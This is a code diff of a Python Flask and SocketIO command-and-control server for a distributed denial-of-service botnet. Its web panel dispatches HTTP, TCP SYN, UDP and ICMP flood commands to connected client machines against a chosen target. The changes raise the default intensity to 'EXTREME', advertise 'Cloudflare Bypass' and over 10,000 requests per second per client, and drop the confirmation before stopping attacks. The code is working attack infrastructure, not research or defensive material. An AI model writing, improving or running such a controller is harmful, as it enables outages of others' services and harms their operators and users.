@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-C2 Server - Controls ALL clients with real Layer 3-7 attacks
+C2 Server - Fixed with better connection handling
 """
 from flask import Flask, render_template_string, request, jsonify
 from flask_socketio import SocketIO, emit
@@ -15,7 +15,17 @@ from typing import Dict, List, Optional
 PORT = int(os.environ.get('PORT', 5000))
 app = Flask(__name__)
 app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'your-secret-key-here')
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
+
+# Configure SocketIO with better settings
+socketio = SocketIO(
+    app, 
+    cors_allowed_origins="*", 
+    async_mode='threading',
+    ping_timeout=120,  # Wait 2 minutes for pong
+    ping_interval=25,  # Send ping every 25 seconds
+    logger=False,
+    engineio_logger=False
+)
 
 clients = {}
 attacks = {}
@@ -41,6 +51,13 @@ class ClientInfo:
             self.stats = {"requests": 0, "rps": 0, "success": 0}
         if self.last_seen is None:
             self.last_seen = self.connected_at
+    
+    def to_dict(self):
+        """Convert to JSON-serializable dict"""
+        d = asdict(self)
+        d['connected_at'] = self.connected_at.isoformat()
+        d['last_seen'] = self.last_seen.isoformat()
+        return d
 
 @dataclass 
 class AttackInfo:
@@ -68,6 +85,14 @@ class AttackInfo:
                 "total_bytes": 0,
                 "client_results": {}
             }
+    
+    def to_dict(self):
+        """Convert to JSON-serializable dict"""
+        d = asdict(self)
+        d['created_at'] = self.created_at.isoformat()
+        d['started_at'] = self.started_at.isoformat() if self.started_at else None
+        d['completed_at'] = self.completed_at.isoformat() if self.completed_at else None
+        return d
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -115,8 +140,8 @@ HTML_TEMPLATE = """
 <body>
     <div class="container">
         <div class="header">
-            <h1>⚡ LAYER 3-7 ATTACK CONTROLLER</h1>
-            <p style="font-size: 1.2em; color: #00ff00;">Real Network Attacks • Multiple Protocols • Distributed Power</p>
+            <h1>⚡ EXTREME ATTACK CONTROLLER</h1>
+            <p style="font-size: 1.2em; color: #00ff00;">Thousands of Requests Per Minute • Cloudflare Bypass</p>
         </div>
         
         <div class="panel">
@@ -149,16 +174,17 @@ HTML_TEMPLATE = """
             <h2>🎯 Launch Distributed Attack</h2>
             
             <div class="layer-info">
-                <h4>📡 Supported Attack Methods:</h4>
-                <p><strong>Layer 7:</strong> HTTP GET, HTTP POST, Slowloris</p>
-                <p><strong>Layer 4:</strong> TCP SYN Flood, UDP Flood</p>
+                <h4>📡 Attack Capabilities:</h4>
+                <p><strong>Layer 7:</strong> HTTP GET/POST (10,000+ RPS per client)</p>
+                <p><strong>Layer 4:</strong> TCP SYN, UDP Flood</p>
                 <p><strong>Layer 3:</strong> ICMP Ping Flood</p>
+                <p><strong>Features:</strong> Cloudflare Bypass, Multiple Browser Profiles, Keep-Alive</p>
             </div>
             
             <div class="attack-form">
                 <div class="form-group">
                     <label>🎯 Target URL/IP:</label>
-                    <input type="text" id="target" placeholder="https://example.com or 1.2.3.4" value="https://example.com">
+                    <input type="text" id="target" placeholder="https://example.com" value="https://example.com">
                 </div>
                 <div class="form-group">
                     <label>⚡ Attack Method:</label>
@@ -166,7 +192,6 @@ HTML_TEMPLATE = """
                         <optgroup label="Layer 7 (HTTP/HTTPS)">
                             <option value="http">HTTP GET Flood</option>
                             <option value="post">HTTP POST Flood</option>
-                            <option value="slowloris">Slowloris (Keep-Alive)</option>
                         </optgroup>
                         <optgroup label="Layer 4 (Transport)">
                             <option value="tcp">TCP SYN Flood</option>
@@ -182,17 +207,17 @@ HTML_TEMPLATE = """
                     <input type="number" id="duration" value="60" min="10" max="3600">
                 </div>
                 <div class="form-group">
-                    <label>💥 Intensity:</label>
+                    <label>💥 Power Level:</label>
                     <select id="intensity">
                         <option value="low">Low (Testing)</option>
-                        <option value="medium" selected>Medium (Normal)</option>
+                        <option value="medium">Medium (Normal)</option>
                         <option value="high">High (Aggressive)</option>
-                        <option value="extreme">Extreme (Maximum)</option>
+                        <option value="extreme" selected>EXTREME (Maximum)</option>
                     </select>
                 </div>
                 <div class="button-group">
-                    <button onclick="startAttack()">🚀 LAUNCH ATTACK ON ALL CLIENTS</button>
-                    <button class="danger" onclick="stopAttack()">🛑 EMERGENCY STOP</button>
+                    <button onclick="startAttack()">🚀 LAUNCH ATTACK</button>
+                    <button class="danger" onclick="stopAttack()">🛑 STOP ALL</button>
                 </div>
             </div>
         </div>
@@ -201,7 +226,7 @@ HTML_TEMPLATE = """
             <h2>💻 Connected Clients (<span id="client-list-count">0</span>)</h2>
             <div class="client-grid" id="clients-container">
                 <div style="text-align: center; padding: 40px; color: #666; grid-column: 1 / -1;">
-                    No clients connected. Run c2_client.py on computers.
+                    No clients connected. Run client.py on computers.
                 </div>
             </div>
         </div>
@@ -242,13 +267,13 @@ HTML_TEMPLATE = """
         });
         
         socket.on('client_attack_start', (data) => {
-            addLog(`⚡ ${data.client_id} started attacking ${data.target}`);
+            addLog(`⚡ ${data.client_id} started attacking`);
             updateClientList();
         });
         
         socket.on('client_attack_complete', (data) => {
             const r = data.results;
-            addLog(`✅ ${data.client_id} completed: ${r.requests.toLocaleString()} requests, ${r.rps.toFixed(1)} RPS, ${(r.bytes_sent/1024/1024).toFixed(2)} MB`);
+            addLog(`✅ Client completed: ${r.requests.toLocaleString()} requests @ ${r.rps.toFixed(0)} RPS`);
             totalBandwidth += r.bytes_sent || 0;
             document.getElementById('total-bandwidth').textContent = (totalBandwidth / 1024 / 1024).toFixed(2) + ' MB';
             updateClientList();
@@ -256,7 +281,7 @@ HTML_TEMPLATE = """
         
         socket.on('attack_completed', (data) => {
             addLog(`🎉 ALL CLIENTS COMPLETED!`, 'success');
-            addLog(`📊 Total: ${data.results.total_requests.toLocaleString()} requests | Success: ${data.results.total_success.toFixed(1)}% | Avg RPS: ${data.results.avg_rps.toFixed(1)} | Bandwidth: ${(data.results.total_bytes/1024/1024).toFixed(2)} MB`, 'success');
+            addLog(`📊 Total: ${data.results.total_requests.toLocaleString()} requests | RPS: ${data.results.avg_rps.toFixed(0)}`, 'success');
             currentAttackId = null;
             updateStats();
         });
@@ -273,7 +298,6 @@ HTML_TEMPLATE = """
             log.appendChild(entry);
             log.scrollTop = log.scrollHeight;
             
-            // Keep only last 100 entries
             while (log.children.length > 100) {
                 log.removeChild(log.firstChild);
             }
@@ -300,7 +324,7 @@ HTML_TEMPLATE = """
                     if (data.total === 0) {
                         container.innerHTML = `
                             <div style="text-align: center; padding: 40px; color: #666; grid-column: 1 / -1;">
-                                No clients connected. Run c2_client.py on computers.
+                                No clients connected. Run client.py on computers.
                             </div>
                         `;
                         return;
@@ -318,9 +342,8 @@ HTML_TEMPLATE = """
                             <p><strong>⚡ CPU:</strong> ${client.cpu_count} cores</p>
                             <p><strong>💾 RAM:</strong> ${Math.round(client.memory_total / 1024 / 1024 / 1024)} GB</p>
                             <p><strong>🕐 Connected:</strong> ${new Date(client.connected_at).toLocaleTimeString()}</p>
-                            ${client.current_attack ? `<p><strong>🎯 Attack:</strong> ${client.current_attack}</p>` : ''}
                             ${client.stats.requests > 0 ? `<p><strong>📊 Requests:</strong> ${client.stats.requests.toLocaleString()}</p>` : ''}
-                            ${client.stats.rps > 0 ? `<p><strong>⚡ RPS:</strong> ${client.stats.rps.toFixed(1)}</p>` : ''}
+                            ${client.stats.rps > 0 ? `<p><strong>⚡ RPS:</strong> ${client.stats.rps.toFixed(0)}</p>` : ''}
                         `;
                         container.appendChild(card);
                     });
@@ -334,54 +357,38 @@ HTML_TEMPLATE = """
             const intensity = document.getElementById('intensity').value;
             
             if (!target) {
-                alert('❌ Please enter a target URL or IP');
+                alert('❌ Please enter a target');
                 return;
             }
             
-            // RPS based on intensity
-            const rpsMap = {
-                'low': 50,
-                'medium': 200,
-                'high': 500,
-                'extreme': 1000
-            };
-            const rps = rpsMap[intensity] || 200;
-            
-            addLog(`🚀 Launching ${layer.toUpperCase()} attack on ${target}...`, 'warning');
+            addLog(`🚀 Launching ${layer.toUpperCase()} attack...`, 'warning');
             
             fetch('/api/attack/start', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({target, layer, duration, rps})
+                body: JSON.stringify({target, layer, duration, intensity})
             })
             .then(r => r.json())
             .then(data => {
                 if (data.success) {
                     addLog(`✅ ${data.message}`, 'success');
                 } else {
-                    addLog(`❌ Attack failed: ${data.error}`, 'error');
+                    addLog(`❌ ${data.error}`, 'error');
                 }
             });
         }
         
         function stopAttack() {
-            if (confirm('⚠️ Stop all running attacks?')) {
-                fetch('/api/attack/stop', {method: 'POST'})
-                    .then(r => r.json())
-                    .then(data => {
-                        addLog(data.message, data.success ? 'warning' : 'error');
-                    });
-            }
+            fetch('/api/attack/stop', {method: 'POST'})
+                .then(r => r.json())
+                .then(data => {
+                    addLog(data.message, 'warning');
+                });
         }
         
-        // Initial load
         updateStats();
         updateClientList();
         setInterval(updateClientList, 3000);
-        setInterval(() => {
-            const log = document.getElementById('log-container');
-            log.scrollTop = log.scrollHeight;
-        }, 100);
     </script>
 </body>
 </html>
@@ -397,7 +404,7 @@ def get_clients():
         return jsonify({
             "success": True,
             "total": len(clients),
-            "clients": [asdict(client) for client in clients.values()]
+            "clients": [client.to_dict() for client in clients.values()]
         })
 
 @app.route('/api/stats')
@@ -423,7 +430,6 @@ def start_attack():
         target = data['target']
         layer = data.get('layer', 'http')
         duration = int(data.get('duration', 60))
-        rps = int(data.get('rps', 100))
         
         attack_id = f"attack_{int(time.time())}"
         
@@ -433,7 +439,7 @@ def start_attack():
                 target=target,
                 method=layer,
                 duration=duration,
-                rps=rps,
+                rps=0,
                 created_at=datetime.now(),
                 status="starting"
             )
@@ -455,26 +461,26 @@ def start_attack():
                     'target': target,
                     'method': layer,
                     'duration': duration,
-                    'rps': rps,
                     'command': 'start'
-                }, room=client_id)
+                }, to=client_id)
         
         attack.status = "running"
         attack.started_at = datetime.now()
         
         socketio.emit('attack_started', {
             'attack_id': attack_id,
-            'attack': asdict(attack)
+            'attack': attack.to_dict()
         })
         
         return jsonify({
             "success": True,
-            "message": f"Attack started on {attack.client_count} clients",
+            "message": f"Attack launched on {attack.client_count} clients",
             "attack_id": attack_id,
             "client_count": attack.client_count
         })
         
     except Exception as e:
+        print(f"[!] Attack start error: {e}")
         return jsonify({"success": False, "error": str(e)}), 500
 
 @app.route('/api/attack/stop', methods=['POST'])
@@ -483,7 +489,7 @@ def stop_attack():
         for client in clients.values():
             client.status = "idle"
             client.current_attack = None
-            socketio.emit('attack_command', {'command': 'stop'}, room=client.id)
+            socketio.emit('attack_command', {'command': 'stop'}, to=client.id)
     
     with attack_lock:
         for attack in attacks.values():
@@ -515,10 +521,12 @@ def handle_client_register(data):
         )
         clients[client_id] = client
     
+    print(f"[+] Client registered: {client.name}")
+    
     emit('welcome', {'message': 'Connected to C2 Server', 'client_id': client_id})
     
     socketio.emit('client_connected', {
-        'client': asdict(client),
+        'client': client.to_dict(),
         'total_clients': len(clients)
     })
 
@@ -528,7 +536,9 @@ def handle_client_stats(data):
     with client_lock:
         if client_id in clients:
             clients[client_id].last_seen = datetime.now()
-            clients[client_id].stats.update(data.get('stats', {}))
+            stats = data.get('stats', {})
+            if stats:
+                clients[client_id].stats.update(stats)
 
 @socketio.on('attack_started')
 def handle_client_attack_start(data):
@@ -537,14 +547,6 @@ def handle_client_attack_start(data):
         'client_id': client_id,
         'target': data.get('target'),
         'attack_id': data.get('attack_id')
-    })
-
-@socketio.on('attack_progress')
-def handle_attack_progress(data):
-    client_id = request.sid
-    socketio.emit('client_attack_progress', {
-        'client_id': client_id,
-        'progress': data
     })
 
 @socketio.on('attack_complete')
@@ -573,7 +575,7 @@ def handle_attack_complete(data):
                 attack.completed_at = datetime.now()
                 
                 if attack.client_count > 0:
-                    attack.results["avg_rps"] = attack.results["total_requests"] / attack.duration
+                    attack.results["avg_rps"] = attack.results["total_requests"] / attack.duration if attack.duration > 0 else 0
                     attack.results["total_success"] = (attack.results["total_success"] / attack.client_count) if attack.client_count > 0 else 0
                 
                 socketio.emit('attack_completed', {
@@ -621,17 +623,16 @@ def background_tasks():
 if __name__ == '__main__':
     print("""
     ╔══════════════════════════════════════╗
-    ║  LAYER 3-7 DISTRIBUTED C2 SERVER    ║
-    ║  Real Network Attacks               ║
-    ║  Multiple Protocol Support          ║
+    ║   EXTREME ATTACK C2 SERVER          ║
+    ║   Thousands of Requests/Min         ║
+    ║   Cloudflare Bypass Enabled         ║
     ╚══════════════════════════════════════╝
     """)
     
     threading.Thread(target=background_tasks, daemon=True).start()
     
     print(f"[📡] Server starting on port {PORT}")
-    print(f"[🔗] Web interface: http://localhost:{PORT}")
-    print(f"[⚡] Supports: HTTP GET/POST, Slowloris, TCP, UDP, ICMP")
-    print(f"[💻] Run c2_client.py on ALL computers\n")
+    print(f"[🔗] Web: http://localhost:{PORT}")
+    print(f"[💥] Ready for extreme attacks\n")
     
     socketio.run(app, host='0.0.0.0', port=PORT, debug=False, allow_unsafe_werkzeug=True)
